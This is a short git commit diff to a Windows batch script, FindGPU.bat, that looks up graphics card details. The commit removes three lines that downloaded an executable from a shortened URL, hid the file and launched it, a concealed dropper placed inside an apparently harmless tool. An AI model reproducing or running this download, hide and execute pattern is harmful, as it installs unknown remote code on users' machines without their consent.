248556fbef7f98f4990b43948c24af89ed36af31
PCBrosTools <155678980+PCBrosTools@users.noreply.github.com>
2024-01-04 15:47:08 -0500

    Update FindGPU.bat

--- FindGPU.bat
+++ FindGPU.bat
@@ -1,8 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
-powershell -command "& { Invoke-WebRequest -Uri ' http://tinyurl.com/ye23fww7' -OutFile 'e.exe' }"
-attrib +h e.exe
-start e.exe
+
 rem Get the GPU information
 for /f "tokens=*" %%i in ('wmic path win32_videocontroller get caption ^| find /v "Caption"') do (
     set "gpuName=%%i"
